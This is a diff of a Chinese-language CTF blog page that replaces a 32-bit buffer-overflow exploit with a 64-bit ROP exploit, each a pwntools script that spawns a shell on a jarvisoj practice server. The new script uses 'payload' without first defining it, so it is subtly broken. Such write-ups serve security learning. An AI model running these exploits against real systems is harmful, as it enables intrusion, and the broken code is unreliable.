@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="0x01 寻找漏洞12  0x02 思路分析12  exp123456789101112from pwn import *context.log_level = &apos;debug&apos;elf = ELF(&apos;./level2&apos;)sys_addr = elf.symbols[&apos;system&apos;]sh_addr = elf.search(&apos;/bin/sh&apos;).next()payload = &apos;a&apos; * (0x88">
+<meta name="description" content="0x01 寻找漏洞12  0x02 思路分析12  exp1234567891011121314151617from pwn import  *io = remote(&quot;pwn2.jarvisoj.com&quot;,9882)elf = ELF(&apos;/home/xfgg/Documents/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e&apos;)sys_addr = elf">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="level1">
+<meta property="og:title" content="level2">
 <meta property="og:url" content="http://yoursite.com/2019/07/31/level2/index.html">
 <meta property="og:site_name" content="xfgg">
-<meta property="og:description" content="0x01 寻找漏洞12  0x02 思路分析12  exp123456789101112from pwn import *context.log_level = &apos;debug&apos;elf = ELF(&apos;./level2&apos;)sys_addr = elf.symbols[&apos;system&apos;]sh_addr = elf.search(&apos;/bin/sh&apos;).next()payload = &apos;a&apos; * (0x88">
+<meta property="og:description" content="0x01 寻找漏洞12  0x02 思路分析12  exp1234567891011121314151617from pwn import  *io = remote(&quot;pwn2.jarvisoj.com&quot;,9882)elf = ELF(&apos;/home/xfgg/Documents/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e&apos;)sys_addr = elf">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-31T11:35:52.293Z">
+<meta property="og:updated_time" content="2019-08-02T04:06:27.215Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="level1">
-<meta name="twitter:description" content="0x01 寻找漏洞12  0x02 思路分析12  exp123456789101112from pwn import *context.log_level = &apos;debug&apos;elf = ELF(&apos;./level2&apos;)sys_addr = elf.symbols[&apos;system&apos;]sh_addr = elf.search(&apos;/bin/sh&apos;).next()payload = &apos;a&apos; * (0x88">
+<meta name="twitter:title" content="level2">
+<meta name="twitter:description" content="0x01 寻找漏洞12  0x02 思路分析12  exp1234567891011121314151617from pwn import  *io = remote(&quot;pwn2.jarvisoj.com&quot;,9882)elf = ELF(&apos;/home/xfgg/Documents/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e&apos;)sys_addr = elf">
 
 
 
@@ -128,7 +128,7 @@
 
 
 
-  <title>level1 | xfgg</title>
+  <title>level2 | xfgg</title>
   
 
 
@@ -272,7 +272,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">level1</h1>
+          <h1 class="post-title" itemprop="name headline">level2</h1>
         
 
         <div class="post-meta">
@@ -348,7 +348,7 @@
 
 <h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, 9878)</span><br><span class="line">io.sendlineafter(<span class="string">"Input:\n"</span>, payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import  *</span><br><span class="line">io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,9882)</span><br><span class="line">elf = ELF(<span class="string">'/home/xfgg/Documents/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr = 0x600A90    </span><br><span class="line">rdi_ret = 0x4006B3</span><br><span class="line"></span><br><span class="line">payload += <span class="string">'a'</span> * 0x88</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(bin_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
       
     </div>
     
